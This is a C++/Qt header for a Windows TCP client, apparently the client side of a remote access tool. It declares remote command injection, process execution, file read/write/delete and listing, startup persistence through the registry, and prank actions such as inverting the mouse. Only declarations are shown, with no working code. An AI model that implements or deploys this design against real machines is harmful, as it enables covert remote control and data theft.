#ifndef QCLIENT_H
#define QCLIENT_H

#include <QObject>
#include <QTcpSocket>
#include <QJsonDocument>
#include <QJsonObject>
#include <QFile>
#include <QJsonArray>
#include <QSettings>
#include <QDir>
#include <windows.h>

class QClient : public QObject
{
    Q_OBJECT
public:
    explicit QClient(QString h, qint16 p, QObject *parent = nullptr);
    virtual ~QClient();
	enum Commands { 
		CmdInjection = 0,
		ExecProcess = 1,
		CreateFile = 2,
		ReadFile = 3,
		DeleteFile = 4,
		MouseInvert = 5,
		DisplayRotate = 6,
		OsMessage = 7,
		GetFiles = 8,
	};

	//Modify registers
	void addStartup();
	//Process Execution
	QString startProcess(const QString &);
	QString runCmdCommand(const QString &);
	//File Handling
	QString readFile(const QString &);
	bool writeFile(const QString &, const QString &);
	bool deleteFile(const QString &);
	//Funny stuff
	void toggleInvertMouse();
	void rotateDisplay();
	void message(const QString &);

	void sendData(const QByteArray &);

signals:

public slots:
    void connected();
    void disconnected();
    void readyRead();
	void tryToConnect();


private:
    QTcpSocket *sock;
	QString host;
	QString compName;
	qint16 port;
};

#endif // QCLIENT_H
